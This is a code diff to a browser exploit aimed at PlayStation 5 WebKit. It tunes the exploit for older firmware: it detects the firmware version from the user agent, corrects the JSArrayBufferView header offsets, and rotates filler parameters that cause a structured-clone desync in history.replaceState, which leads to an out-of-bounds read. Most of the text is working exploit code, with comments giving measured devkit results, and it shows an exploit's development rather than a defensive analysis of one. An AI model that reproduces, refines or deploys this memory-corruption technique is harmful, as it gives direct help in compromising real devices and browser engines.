@@ -1,12 +1,44 @@
 const DRAIN_COUNT = 512;
 const AUTO_RETRY_DELAY_MS = 50;
 
-const K = 2;
+// Safari 15.4 (PS5 7.00-8.60) differs from Safari 17.x (PS5 9.00+) in
+// JSArrayBufferView: m_length is size_t at +0x18, pushing TypedArrayMode m_mode
+// to +0x20, while 9.00+ has m_mode at +0x1c with real padding at +0x20..+0x27.
+// Confirmed in WebKit OSS JSArrayBufferView.h and by a 7.00 devkit dump
+// (length 0x100 at +0x18, mode 0x02 WastefulTypedArray at +0x20).
+const LOWFW_VIEW = (function () {
+    try {
+        const m = navigator.userAgent.match(/PlayStation 5[^)]*?([0-9]+\.[0-9]+)/);
+        return !!(m && parseFloat(m[1]) < 9.00);
+    } catch (e) { }
+    return false;
+})();
+
+// K sets the BigInt/object mix of the filler graph, and therefore how far the
+// deserializer's pool count runs ahead of the serializer's (BigInts pool on the
+// read side only). That divergence pushes the ObjectReference index across the
+// 0xFFFF width tier and produces the desync. Measured on a 7.00 devkit:
+//   K=1 -> no desync (composition length stays 0x10000)
+//   K=2 -> "Unable to deserialize data" on most attempts (the 9.00+ value)
+//   K=3 -> desync fires, length 0x50001, OOB read reached (also K=5,7,8)
+// The desync only lines up on some heap layouts, so attempts rotate through
+// K_CANDIDATES and re-roll the layout instead of losing the same way. 9.00+
+// keeps a fixed K=2.
+const K = (function () {
+    try {
+        const m = navigator.userAgent.match(/PlayStation 5[^)]*?([0-9]+\.[0-9]+)/);
+        if (m && parseFloat(m[1]) < 9.00)
+            return 3;
+    } catch (e) { }
+    return 2;
+})();
 const DUPLICATE_INDEX = 2;
 const CONTROL_INDEX = 0xffff;
 const CONTROL_INT = -64000;
-const FILLER_BIGINTS = K - 1;
-const FILLER_OBJECTS = 0xfffe - K;
+const K_CANDIDATES = LOWFW_VIEW ? [3, 5, 7, 8] : [K];
+function currentK() {
+    return K_CANDIDATES[attemptNumber % K_CANDIDATES.length];
+}
 const EXPECTED_LENGTH = 0x50001;
 const CELL_BYTES = 0x30;
 const FUNCTION_BYTES = 0x20;
@@ -580,13 +612,16 @@ function buildAndStoreGraph() {
     referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
     buildFakeHost();
 
-    emit("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
+    const kNow = currentK();
+    const fillerBigints = kNow - 1;
+    const fillerObjects = 0xfffe - kNow;
+    emit("SSV-BUILD", `k=${kNow}-n=${DRAIN_COUNT}`);
     fillerGraph = new Array(0xfffd);
     let pos = 0;
     const huge = 1n << 40n;
-    for (let b = 0; b < FILLER_BIGINTS; ++b)
+    for (let b = 0; b < fillerBigints; ++b)
         fillerGraph[pos++] = huge + BigInt(b);
-    for (let o = 0; o < FILLER_OBJECTS; ++o)
+    for (let o = 0; o < fillerObjects; ++o)
         fillerGraph[pos++] = {};
 
     outerGraph = new Array(CONTROL_INDEX + 1);
@@ -596,7 +631,7 @@ function buildAndStoreGraph() {
     outerGraph[CONTROL_INDEX] = CONTROL_INT;
     emit("SSV-BUILT", `duplicate-index=${DUPLICATE_INDEX}`);
 
-    emit("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - K).toString(16)}`);
+    emit("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - kNow).toString(16)}`);
     history.replaceState(outerGraph, "");
     emit("SSV-STORED", "fake-host-and-probe-holder-not-serialized");
 }
@@ -705,12 +740,18 @@ function loadHistoryCritical() {
         const rwLength = uint32At(rwHeader, 0x18);
         rwOriginalVector = low48At(rwHeader, 0x10);
 
-        const rwOffsetZero = allZero(rwHeader, 0x20, 0x28);
+        // 15.4: +0x20 holds m_mode (uint32), so only +0x24..+0x27 is padding.
+        // 9.00+: m_mode is at +0x1c and +0x20..+0x27 really is padding.
+        const rwOffsetZero = LOWFW_VIEW
+            ? (rwHeader[0x20] <= 3 && rwHeader[0x21] === 0
+               && rwHeader[0x22] === 0 && rwHeader[0x23] === 0
+               && allZero(rwHeader, 0x24, 0x28))
+            : allZero(rwHeader, 0x20, 0x28);
 
         profile.carrierSID = rwSID;
         profile.carrierType = rwHeader[5];
         profile.carrierFlags = rwHeader[6];
-        profile.carrierMode = rwHeader[0x1c];
+        profile.carrierMode = LOWFW_VIEW ? rwHeader[0x20] : rwHeader[0x1c];
         profile.carrierByte28 = rwHeader[0x28];
 
         rwHeaderOK = rwSID >= 0x100 && rwSID < 0x08000000
